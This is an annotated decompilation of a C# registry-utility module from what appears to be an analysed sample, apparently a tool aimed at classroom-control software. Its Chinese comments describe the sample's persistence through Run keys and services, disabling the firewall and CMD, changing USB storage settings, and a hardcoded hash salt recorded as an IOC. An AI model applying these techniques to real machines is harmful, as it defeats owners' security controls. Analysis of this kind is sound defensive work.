using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace jfglzsn.Internal
{
	// Token: 0x02000010 RID: 16
	/// <summary>
	/// 全局工具模块（VB <c>[StandardModule]</c>）：**注册表读写总封装** + 一个 SHA256 摘要函数。
	/// 全部注册表操作都由本模块统一收口，上层窗体只调用这里。
	/// <para>
	/// 本类的敏感度最高：样本几乎所有持久化与「机房管控」动作都落在这些方法上——
	/// 读写自启动项 <c>...\CurrentVersion\Run</c>、改 USB 存储驱动 <c>usbstor\Start</c>、
	/// 关 Windows 防火墙、禁 CMD（<c>DisableCMD</c>）、删 <c>IFEO\route.exe</c> 劫持键等。
	/// </para>
	/// <para>
	/// 另外还声明了 6 个 advapi32 的 CryptoAPI P/Invoke（CryptAcquireContext 一族）与配套常量，
	/// 但**全工程没有任何调用点**——这是壳（.NET Reactor / IntelliLock）做哈希校验时的遗留物。
	/// </para>
	/// </summary>
	[StandardModule]
	internal sealed class ThreadEvent
	{
		// Token: 0x060000A6 RID: 166
		/// <summary>CryptoAPI：获取 CSP 句柄（未使用）。</summary>
		/// <param name="phProv">输出 CSP 句柄。</param>
		/// <param name="szContainer">密钥容器名。</param>
		/// <param name="szProvider">CSP 提供者名。</param>
		/// <param name="dwProvType">提供者类型，见 <see cref="PROV_RSA_FULL"/>。</param>
		/// <param name="dwFlags">标志，见 <see cref="CRYPT_VERIFYCONTEXT"/>。</param>
		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptAcquireContext(ref IntPtr phProv, string szContainer, string szProvider, int dwProvType, int dwFlags);

		// Token: 0x060000A7 RID: 167
		/// <summary>CryptoAPI：创建哈希对象（未使用）。</summary>
		/// <param name="hProv">CSP 句柄。</param>
		/// <param name="Algid">算法标识，见 <see cref="CALG_MD5"/>。</param>
		/// <param name="hKey">密钥句柄，无则传 <c>IntPtr.Zero</c>。</param>
		/// <param name="dwFlags">保留，取 0。</param>
		/// <param name="phHash">输出哈希句柄。</param>
		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptCreateHash(IntPtr hProv, int Algid, IntPtr hKey, int dwFlags, ref IntPtr phHash);

		// Token: 0x060000A8 RID: 168
		/// <summary>CryptoAPI：把数据喂给哈希对象（未使用）。</summary>
		/// <param name="hHash">哈希句柄。</param>
		/// <param name="pbData">数据缓冲。</param>
		/// <param name="dwDataLen">数据长度。</param>
		/// <param name="dwFlags">保留，取 0。</param>
		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptHashData(IntPtr hHash, byte[] pbData, int dwDataLen, int dwFlags);

		// Token: 0x060000A9 RID: 169
		/// <summary>CryptoAPI：取哈希参数/摘要值（未使用）。</summary>
		/// <param name="hHash">哈希句柄。</param>
		/// <param name="dwParam">参数类型，见 <see cref="HP_HASHVAL"/>。</param>
		/// <param name="pbData">接收缓冲。</param>
		/// <param name="pdwDataLen">输入缓冲长度 / 输出实际长度。</param>
		/// <param name="dwFlags">保留，取 0。</param>
		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptGetHashParam(IntPtr hHash, int dwParam, byte[] pbData, ref int pdwDataLen, int dwFlags);

		// Token: 0x060000AA RID: 170
		/// <summary>CryptoAPI：销毁哈希句柄（未使用）。</summary>
		/// <param name="hHash">哈希句柄。</param>
		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool CryptDestroyHash(IntPtr hHash);

		// Token: 0x060000AB RID: 171
		/// <summary>CryptoAPI：释放 CSP 句柄（未使用）。</summary>
		/// <param name="hProv">CSP 句柄。</param>
		/// <param name="dwFlags">保留，取 0。</param>
		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool CryptReleaseContext(IntPtr hProv, int dwFlags);

		// Token: 0x060000AC RID: 172 RVA: 0x00008120 File Offset: 0x00006320
		/// <summary>
		/// 计算 <c>SHA256(UTF8(输入 + "bfdshgs"))</c> 并输出 64 位小写十六进制串。
		/// <para>
		/// 固定后缀 <c>"bfdshgs"</c> 相当于硬编码盐——本工程的「口令/机器码」类摘要都用它，
		/// 是本样本的稳定特征串（IOC）。调用方见 Form2 / Form4 的注册码校验。
		/// </para>
		/// </summary>
		/// <param name="原文">待摘要的字符串（调用方通常已 Trim）。</param>
		/// <returns>64 字符小写十六进制摘要。</returns>
		public static string 计算SHA256摘要(string 原文)
		{
			string 摘要;
			using (SHA256 sha = SHA256.Create())
			{
				byte[] 哈希 = sha.ComputeHash(Encoding.UTF8.GetBytes(原文 + "bfdshgs"));
				StringBuilder 构造器 = new StringBuilder();
				foreach (byte 字节 in 哈希)
				{
					构造器.Append(字节.ToString("x2"));
				}
				摘要 = 构造器.ToString();
			}
			return 摘要;
		}

		// Token: 0x060000AD RID: 173 RVA: 0x000081A4 File Offset: 0x000063A4
		/// <summary>
		/// 读注册表值：打开 <paramref name="子键路径"/>，取 <paramref name="值名"/>，缺省返回 <paramref name="默认值"/>。
		/// <para>
		/// 原版是 VB 的 <c>On Error Resume Next</c>：整段只有一条读语句，出错就丢弃错误继续往下走。
		/// 因此这里用单个 <c>catch { }</c> 还原，**不能**删掉它——
		/// 键不存在、无权限等情况下原版同样静默返回，只是此时返回值是 <c>null</c>（而不是 <paramref name="默认值"/>），
		/// 因为赋值语句还没执行到。上层大量用 <c>Conversions.ToString(...)</c> / <c>Conversions.ToInteger(...)</c> 接这个
		/// <c>null</c>，分别得到 <c>""</c> 和 <c>0</c>——这条差异会直接影响判断逻辑，务必保留。
		/// </para>
		/// </summary>
		/// <param name="根键">注册表根键（HKLM / HKCU 等）。</param>
		/// <param name="子键路径">子键相对路径。</param>
		/// <param name="值名">值名称。</param>
		/// <param name="默认值">值不存在时的返回值。</param>
		/// <returns>读到的值；出错时为 <c>null</c>。</returns>
		public static object 读注册表值(RegistryKey 根键, string 子键路径, string 值名, object 默认值 = null)
		{
			object 结果 = null;
			try
			{
				using (RegistryKey 子键 = 根键.OpenSubKey(子键路径))
				{
					if (子键 != null)
					{
						结果 = 子键.GetValue(值名, RuntimeHelpers.GetObjectValue(默认值));
					}
					else
					{
						结果 = 默认值;
					}
				}
			}
			catch
			{
				// 原版 On Error Resume Next：读失败静默丢弃错误，结果保持 null（不是默认值）
			}
			return 结果;
		}

		// Token: 0x060000AE RID: 174 RVA: 0x0000826C File Offset: 0x0000646C
		/// <summary>
		/// 写注册表值：可写模式下打开子键，键不存在时先创建再写。
		/// <para>
		/// 原版用 <c>goto</c> 跳过「写已存在的键」那一步，等价于 if/else：
		/// 键缺失 → 在新建的子键上写；键存在 → 直接在原键上写。两条分支只走一条。
		/// 任何失败都会被包成 <c>new Exception("写入注册表值时发生错误: ...")</c> 往上抛（原版行为，勿改成静默）。
		/// </para>
		/// </summary>
		/// <param name="根键">注册表根键。</param>
		/// <param name="子键路径">子键相对路径。</param>
		/// <param name="值名">值名称。</param>
		/// <param name="值">要写入的值。</param>
		/// <param name="值类型">值类型，默认字符串。</param>
		public static void 写注册表值(RegistryKey 根键, string 子键路径, string 值名, object 值, RegistryValueKind 值类型 = RegistryValueKind.String)
		{
			try
			{
				using (RegistryKey 子键 = 根键.OpenSubKey(子键路径, true))
				{
					if (子键 == null)
					{
						// 键不存在：新建后写入，然后跳过下面那一步
						using (RegistryKey 新建子键 = 根键.CreateSubKey(子键路径))
						{
							新建子键.SetValue(值名, RuntimeHelpers.GetObjectValue(值), 值类型);
						}
					}
					else
					{
						子键.SetValue(值名, RuntimeHelpers.GetObjectValue(值), 值类型);
					}
				}
			}
			catch (Exception ex)
			{
				throw new Exception("写入注册表值时发生错误: " + ex.Message);
			}
		}

		// Token: 0x060000AF RID: 175 RVA: 0x0000830C File Offset: 0x0000650C
		/// <summary>
		/// 删除注册表值：值不存在时**不**报错（<c>DeleteValue(name, false)</c>），子键不存在则什么都不做。
		/// </summary>
		/// <param name="根键">注册表根键。</param>
		/// <param name="子键路径">子键相对路径。</param>
		/// <param name="值名">要删除的值名称。</param>
		public static void 删除注册表值(RegistryKey 根键, string 子键路径, string 值名)
		{
			try
			{
				using (RegistryKey 子键 = 根键.OpenSubKey(子键路径, true))
				{
					if (子键 != null)
					{
						子键.DeleteValue(值名, false);
					}
				}
			}
			catch (Exception ex)
			{
				throw new Exception("删除注册表值时发生错误: " + ex.Message);
			}
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x00008378 File Offset: 0x00006578
		/// <summary>
		/// 判断子键是否存在；任何异常（无权限等）一律当作「不存在」返回 <c>false</c>。
		/// </summary>
		/// <param name="根键">注册表根键。</param>
		/// <param name="子键路径">子键相对路径。</param>
		/// <returns>存在为 <c>true</c>。</returns>
		public static bool 注册表键存在(RegistryKey 根键, string 子键路径)
		{
			bool 存在;
			try
			{
				using (RegistryKey 子键 = 根键.OpenSubKey(子键路径))
				{
					存在 = 子键 != null;
				}
			}
			catch (Exception ex)
			{
				存在 = false;
			}
			return 存在;
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x000083CC File Offset: 0x000065CC
		/// <summary>
		/// 确保子键存在：不存在就创建（<c>CreateSubKey</c> 幂等），随后返回 <c>true</c>。
		/// <para>
		/// 原版的 <c>using (根键.CreateSubKey(...))</c> 没接变量，创建出来的键会被立即释放；
		/// 这里保持同样的写法与释放时机，不要"顺手"改成延迟释放。
		/// </para>
		/// </summary>
		/// <param name="根键">注册表根键。</param>
		/// <param name="子键路径">子键相对路径。</param>
		/// <returns>正常情况下恒为 <c>true</c>；失败会抛异常。</returns>
		public static bool 确保注册表键存在(RegistryKey 根键, string 子键路径)
		{
			bool 结果;
			try
			{
				using (RegistryKey 子键 = 根键.OpenSubKey(子键路径))
				{
					if (子键 == null)
					{
						using (根键.CreateSubKey(子键路径))
						{
							return true;
						}
					}
					结果 = true;
				}
			}
			catch (Exception ex)
			{
				throw new Exception("确保注册表键存在操作失败: " + ex.Message);
			}
			return 结果;
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x00008450 File Offset: 0x00006650
		/// <summary>
		/// 删除注册表键（**非递归**：<c>DeleteSubKey</c>，子键下若还有子键会抛异常并被包成一般异常抛出）。
		/// 键不存在时什么都不做。
		/// </summary>
		/// <param name="根键">注册表根键。</param>
		/// <param name="子键路径">要删除的子键相对路径。</param>
		public static void 删除注册表键(RegistryKey 根键, string 子键路径)
		{
			try
			{
				if (ThreadEvent.注册表键存在(根键, 子键路径))
				{
					根键.DeleteSubKey(子键路径);
				}
			}
			catch (Exception ex)
			{
				throw new Exception("删除注册表键时发生错误: " + ex.Message);
			}
		}

		// Token: 0x04000099 RID: 153
		/// <summary>
		/// 当前进程名（不含扩展名）。由 Form1 启动时用随机字母拼出来并赋给服务/自启动项，
		/// 见 Form1 的 <see cref="写注册表值"/> 调用与 <c>sc create</c> 命令行。
		/// </summary>
		public static string m_AdapterEvent;

		// Token: 0x0400009A RID: 154
		/// <summary>当前可执行文件名（<see cref="m_AdapterEvent"/> + <c>".exe"</c>），用于注册服务与自启动路径。</summary>
		public static string _AdvisorEvent;

		// Token: 0x0400009B RID: 155
		/// <summary>
		/// 锁屏/结束限制标志。Form4（锁屏窗体）的 FormClosing 里读取它：
		/// 为 <c>false</c> 允许关闭并把鼠标重新限制在整屏，为 <c>true</c> 则取消关闭。
		/// 本工程内没有任何地方把它置 <c>true</c>，因此锁屏窗实际总是可关闭的。
		/// </summary>
		public static bool mapperEvent = false;

		// Token: 0x0400009C RID: 156
		/// <summary>CryptoAPI 常量 PROV_RSA_FULL（未使用）。</summary>
		private const int PROV_RSA_FULL = 1;

		// Token: 0x0400009D RID: 157
		/// <summary>CryptoAPI 常量 CRYPT_VERIFYCONTEXT（0xF0000000，未使用）。</summary>
		private const int CRYPT_VERIFYCONTEXT = -268435456;

		// Token: 0x0400009E RID: 158
		/// <summary>CryptoAPI 常量 CALG_MD5（0x8003 = 32771，未使用）。</summary>
		private const int CALG_MD5 = 32771;

		// Token: 0x0400009F RID: 159
		/// <summary>CryptoAPI 常量 HP_HASHVAL（未使用）。</summary>
		private const int HP_HASHVAL = 2;

		// Token: 0x040000A0 RID: 160
		/// <summary>
		/// 配置项常量：写进 Form1 的配置数组第 76 项，字面值「教室终结者」（疑似产品/服务别名）。
		/// </summary>
		public static string callbackSetter = "教室终结者";

		// Token: 0x040000A1 RID: 161
		/// <summary>
		/// 配置项常量：写进 Form1 的配置数组第 72 项，字面值「易语言程序」——即样本要识别的
		/// 「易语言编写的程序」这一类别名，配合进程枚举判断哪些进程属于被拦截对象。
		/// </summary>
		public static string _EventSetter = "易语言程序";
	}
}
